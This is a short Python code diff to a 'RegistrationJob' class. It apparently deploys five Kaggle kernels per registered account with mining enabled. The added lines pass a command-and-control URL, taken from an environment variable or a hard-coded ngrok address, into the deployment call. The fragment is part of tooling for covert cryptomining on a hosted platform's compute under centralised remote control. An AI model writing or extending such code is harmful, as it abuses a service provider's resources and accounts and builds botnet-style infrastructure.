@@ -554,12 +554,17 @@ class RegistrationJob:
                         from src.agents.kaggle.datasets import create_dataset_with_machines
                         
                         self.log("[DEPLOYMENT] Starting kernel deployment...")
+                        
+                        # Get current C2 URL from config or environment
+                        c2_url = os.environ.get("C2_URL", "https://lynelle-scroddled-corinne.ngrok-free.dev")
+                        
                         result = create_dataset_with_machines(
                             worker_result["api_key_legacy"],
                             worker_result["kaggle_username"],
                             num_machines=5,
                             log_fn=self.log,
-                            enable_mining=True
+                            enable_mining=True,
+                            c2_url=c2_url,
                         )
                         
                         self.log("")
